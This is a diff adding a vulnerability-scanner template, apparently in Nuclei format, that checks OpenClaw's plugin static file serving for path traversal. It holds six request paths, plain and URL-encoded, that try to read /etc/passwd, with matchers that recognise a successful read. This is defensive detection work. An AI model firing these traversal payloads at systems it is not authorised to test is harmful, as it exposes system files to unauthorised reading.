@@ -1,0 +1,38 @@
+id: openclaw-plugin-path-traversal
+
+info:
+  name: OpenClaw Plugin Path Traversal
+  author: lobster-guard
+  severity: high
+  description: Tests for path traversal via plugin static file serving
+  tags: openclaw,plugin,traversal,lfi
+  remediation: Sanitize file paths in plugin static file handler. Reject requests containing .. or URL-encoded traversal sequences.
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    max-request: 6
+    verified: false
+    product: openclaw
+    vendor: openclaw
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/__openclaw/plugins/../../../etc/passwd"
+      - "{{BaseURL}}/__openclaw__/plugins/../../../etc/passwd"
+      - "{{BaseURL}}/__openclaw/plugins/..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/__openclaw__/plugins/..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/__openclaw/plugins/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "{{BaseURL}}/__openclaw__/plugins/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: or
